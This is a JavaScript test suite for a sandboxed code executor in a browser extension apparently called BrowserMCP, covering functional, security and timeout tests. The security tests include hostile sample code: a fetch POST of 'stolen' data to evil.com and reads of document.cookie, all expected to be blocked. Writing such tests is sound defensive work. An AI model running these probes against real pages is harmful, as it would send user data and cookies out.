#!/usr/bin/env node

/**
 * Test suite for secure code execution feature
 * Tests the sandboxed API and security boundaries
 */

console.log('🧪 BrowserMCP Code Execution Test Suite');
console.log('=' .repeat(50));

// Test cases for the sandboxed API
const testCases = [
  {
    name: 'Basic DOM query',
    code: `return api.getText('h1');`,
    expected: 'Should return H1 text content'
  },
  {
    name: 'Multiple element query',
    code: `
      const links = api.$$('a');
      return { count: links.length, sample: links.slice(0, 3).map(a => a.textContent) };
    `,
    expected: 'Should return link count and samples'
  },
  {
    name: 'Element manipulation',
    code: `
      // Hide all ads
      const hidden = api.hide('[class*="ad"]');
      return { hidden: hidden, message: 'Ads hidden' };
    `,
    expected: 'Should hide ad elements'
  },
  {
    name: 'Form interaction',
    code: `
      // Fill a search field
      const filled = api.setValue('input[type="search"]', 'test query');
      return { filled: filled, value: api.getValue('input[type="search"]') };
    `,
    expected: 'Should fill search input'
  },
  {
    name: 'Data extraction',
    code: `
      // Extract page metadata
      const info = api.getPageInfo();
      const links = api.extractLinks('body').length;
      return { ...info, totalLinks: links };
    `,
    expected: 'Should extract page info and link count'
  },
  {
    name: 'Async operations',
    code: `
      // Click and wait
      api.click('button');
      await api.wait(1000);
      return { clicked: true, timestamp: Date.now() };
    `,
    expected: 'Should click button and wait'
  },
  {
    name: 'Complex extraction',
    code: `
      // Extract structured data
      const articles = api.$$('article').map(article => ({
        title: api.getText('h2', article),
        text: api.getText('p', article),
        links: api.extractLinks(article).length
      }));
      return { articles: articles.slice(0, 5) };
    `,
    expected: 'Should extract article data'
  }
];

// Security test cases (should fail or be restricted)
const securityTests = [
  {
    name: 'Direct window access',
    code: `return window.location.href;`,
    shouldFail: true,
    reason: 'Window object should not be directly accessible'
  },
  {
    name: 'Document cookie access',
    code: `return document.cookie;`,
    shouldFail: true,
    reason: 'Cookies should not be accessible'
  },
  {
    name: 'Fetch/XHR access',
    code: `
      return fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify({ data: 'stolen' })
      });
    `,
    shouldFail: true,
    reason: 'Network requests should be blocked'
  },
  {
    name: 'Chrome API access',
    code: `return chrome.runtime.id;`,
    shouldFail: true,
    reason: 'Chrome APIs should not be exposed'
  },
  {
    name: 'Eval usage',
    code: `return eval('1+1');`,
    shouldFail: true,
    reason: 'Eval should be restricted'
  },
  {
    name: 'Prototype pollution',
    code: `
      Object.prototype.polluted = 'hacked';
      return Object.prototype.polluted;
    `,
    shouldFail: false, // May succeed but should be isolated
    reason: 'Prototype changes should be isolated'
  }
];

// Performance test cases
const performanceTests = [
  {
    name: 'Timeout enforcement',
    code: `
      // Infinite loop - should timeout
      while(true) { }
      return 'Should never reach here';
    `,
    timeout: 1000,
    shouldTimeout: true
  },
  {
    name: 'Large data handling',
    code: `
      // Generate large dataset
      const data = [];
      for(let i = 0; i < 10000; i++) {
        data.push({ id: i, value: Math.random() });
      }
      return { count: data.length, sample: data.slice(0, 5) };
    `,
    timeout: 5000,
    shouldComplete: true
  }
];

// Browser console test script
const browserConsoleTest = `
// Run this in the browser console to test the code executor

console.log('🔧 Testing Code Executor...');

// Check if executor is loaded
if (typeof window.__codeExecutorReady !== 'undefined') {
  console.log('✅ Code executor is ready');
  
  // Test the API
  if (typeof MCPSafeAPI !== 'undefined') {
    console.log('✅ Safe API is available');
    console.log('Available methods:', Object.keys(MCPSafeAPI));
    
    // Test basic operations
    try {
      const h1Text = MCPSafeAPI.getText('h1');
      console.log('H1 text:', h1Text);
      
      const linkCount = MCPSafeAPI.count('a');
      console.log('Link count:', linkCount);
      
      const pageInfo = MCPSafeAPI.getPageInfo();
      console.log('Page info:', pageInfo);
      
      console.log('✅ All basic operations work');
    } catch (error) {
      console.error('❌ API test failed:', error);
    }
  } else {
    console.error('❌ Safe API not found');
  }
} else {
  console.error('❌ Code executor not loaded');
  console.log('Inject it first by running any execute command');
}
`;

// Output test documentation
console.log('\n📋 Test Cases:');
console.log('-'.repeat(50));

console.log('\n1️⃣ Functional Tests:');
testCases.forEach((test, i) => {
  console.log(`   ${i + 1}. ${test.name}`);
  console.log(`      Expected: ${test.expected}`);
});

console.log('\n2️⃣ Security Tests:');
securityTests.forEach((test, i) => {
  console.log(`   ${i + 1}. ${test.name}`);
  console.log(`      Should fail: ${test.shouldFail ? 'Yes' : 'No'}`);
  console.log(`      Reason: ${test.reason}`);
});

console.log('\n3️⃣ Performance Tests:');
performanceTests.forEach((test, i) => {
  console.log(`   ${i + 1}. ${test.name}`);
  console.log(`      Timeout: ${test.timeout}ms`);
});

console.log('\n📝 Browser Console Test:');
console.log('-'.repeat(50));
console.log('Copy and run this in the browser console:');
console.log(browserConsoleTest);

console.log('\n🎯 Example Usage:');
console.log('-'.repeat(50));
console.log(`
// Hide all popups and ads
const hideAnnoyances = \`
  const hidden = api.hide('[class*="modal"], [class*="popup"], [class*="ad"]');
  return { hidden: hidden, message: 'Cleaned up page' };
\`;

// Extract all form data
const extractForms = \`
  const forms = api.$$('form').map(form => ({
    action: form.action,
    method: form.method,
    inputs: api.$$('input', form).map(input => ({
      name: input.name,
      type: input.type,
      value: input.value
    }))
  }));
  return forms;
\`;

// Auto-scroll and capture content
const scrollCapture = \`
  const content = [];
  for(let i = 0; i < 5; i++) {
    content.push(api.getText('main'));
    window.scrollBy(0, 500);
    await api.wait(500);
  }
  return content;
\`;
`);

console.log('\n✅ Test suite ready!');
console.log('Run these tests after loading the Chrome extension.');